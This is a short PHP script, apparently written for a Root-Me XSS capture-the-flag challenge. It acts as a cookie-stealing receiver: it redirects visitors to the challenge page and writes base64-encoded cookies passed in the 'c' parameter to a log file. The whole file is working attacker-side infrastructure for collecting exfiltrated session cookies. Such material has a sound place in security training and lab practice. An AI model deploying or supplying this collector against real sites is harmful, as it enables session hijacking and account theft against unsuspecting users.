<?php
	header ('Location:http://challenge01.root-me.org/web-client/ch18');

	if (isset($_GET["c"]))
	{
		$cookies = base64_decode(urldecode($_GET["c"]));
		$file = fopen('log.txt', 'a');
		fwrite($file, $cookies . "\n\n");
	}
?>
